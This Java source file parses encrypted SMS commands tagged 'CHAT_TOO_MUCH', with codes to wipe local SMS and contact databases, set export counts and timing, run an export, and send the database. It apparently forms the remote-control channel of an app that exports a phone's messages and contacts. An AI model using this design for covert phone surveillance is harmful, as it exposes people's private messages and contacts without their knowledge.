package org.gdocument.gchattoomuch.parser;

import org.gdocument.gtracergps.launcher.log.Logger;

import com.cameleon.common.tool.CryptoTool;

public class SmsParser {
	private static final String TAG = SmsParser.class.getSimpleName();
	
	private final static String MSG_START = "CHAT_TOO_MUCH";
	private final static String DATA_SEPARATOR = "|";
	private final static int MSG_START_LENGTH = MSG_START.length();
	private final static int DATA_SEPARATOR_LENGTH = DATA_SEPARATOR.length();

	public enum MSG_TYPE {
		UNKNOW(""),
		CLEAN_DB_SMS("CLNDBSMS"),
		CLEAN_DB_CONTACT("CLNDBCNTCT"),
		SET_SERVICE_EXPORT_TIME("STSRVCTM"),
		SET_SERVICE_EXPORT_SMS_COUNT("STSRVXPRTSMSCNT"),
		SET_SERVICE_EXPORT_CONTACT_COUNT("STSRVXPRTCNTCTCNT"),
		RUN_SERVICE_EXPORT("RNSRVXPRT"),
		SEND_DB("SNDDB");

		public String code;
		public int length;
		MSG_TYPE(String code) {
			this.code = code;
			this.length = code.length();
		}
	};

	private static SmsParser instance = null;

	private SmsParser() {
	}

	public static SmsParser getInstance() {
		if (instance==null) {
			instance = new SmsParser();
		}
		return instance;
	}

	public int fromMessageCountSms(String message) {
		message = unprepareMessage(message);
		String time = fromMessagePart(MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT, message, 0);
		return (time.toLowerCase().equals("null") ? null : Integer.parseInt(time));
	}

	public int fromMessageCountContact(String message) {
		message = unprepareMessage(message);
		String time = fromMessagePart(MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT, message, 0);
		return (time.toLowerCase().equals("null") ? null : Integer.parseInt(time));
	}

	public int fromMessageTime(String message) {
		message = unprepareMessage(message);
		String time = fromMessagePart(MSG_TYPE.SET_SERVICE_EXPORT_TIME, message, 0);
		return (time.toLowerCase().equals("null") ? null : Integer.parseInt(time));
	}

	public String extractMessage(MSG_TYPE type, String message) {
		message = message.substring(type.length + getDataSeparatorLength());
		return message;
	}

	public String getDataSeparator() {
		return DATA_SEPARATOR;
	}

	public int getDataSeparatorLength() {
		return DATA_SEPARATOR_LENGTH;
	}
	
	public String getMessageStart() {
		return MSG_START;
	}

	public MSG_TYPE getMessageType(String message) {
		MSG_TYPE ret = MSG_TYPE.UNKNOW;
		if (isKnowMessage(message)) {
			String type = extractType(message);
			for(MSG_TYPE msgType : MSG_TYPE.values()) {
				if (msgType.code.equals(type)) {
					ret = msgType;
					break;
				}
			}
		}
		return ret;
	}

	public String prepareMessage(MSG_TYPE msgType, String data) {
    	String message = getMessageStart() + getDataSeparator();
    	message +=  CryptoTool.getInstance().crypte(msgType.code + getDataSeparator() + data);
    	return message;
	}

	public String unprepareMessage(String message) {
		message = message.substring(MSG_START_LENGTH + DATA_SEPARATOR_LENGTH);
		message = CryptoTool.getInstance().decrypte(message);
		return message;
	}

	private String fromMessagePart(MSG_TYPE type, String message, int indexNbStart) {
		message = extractMessage(type, message);
		int idx1 = 0;
		for(int i=0 ; i<indexNbStart ; i++) {
			idx1 = message.indexOf(getDataSeparator(), idx1)+getDataSeparatorLength();
		}
		int idx2 = message.indexOf(getDataSeparator(), idx1);
		idx2 = idx2>0 ? idx2 : message.length();
		return message.substring(idx1, idx2);
	}

	private String extractType(String message) {
		message = unprepareMessage(message);
		int idx = message.indexOf(DATA_SEPARATOR);
		return (idx>0) ? message.substring(0, idx) : "";
	}

	private boolean isKnowMessage(String message) {
		return message.startsWith(MSG_START + DATA_SEPARATOR);
	}
	
	@SuppressWarnings("unused")
	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
	
	@SuppressWarnings("unused")
	private void logMe(Exception e) {
		Logger.logMe(TAG, e);
	}
}